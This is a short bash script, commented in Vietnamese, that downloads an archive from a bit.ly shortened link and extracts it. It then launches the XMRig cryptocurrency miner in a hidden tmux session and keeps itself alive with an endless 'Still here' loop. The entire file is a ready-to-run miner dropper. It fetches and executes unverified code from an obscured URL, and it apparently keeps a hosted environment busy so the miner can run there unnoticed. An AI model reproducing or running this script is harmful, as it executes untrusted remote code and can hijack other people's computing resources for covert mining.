#!/bin/bash

# Tải file từ link rút gọn
wget https://bit.ly/xmrig9xcongits

# Giải nén file (giữ đúng tên file gốc)
tar -xvzf xmrig9xcongits

# Di chuyển vào thư mục xmrig
cd xmrig || { echo "Thư mục xmrig không tồn tại!"; exit 1; }

# Chạy xmrig trong tmux session tên là 'xmrig'
tmux new-session -d -s xmrig './xmrig'

# Vòng lặp giữ script hoạt động
while true; do
    echo "Still here"
    sleep 60
done
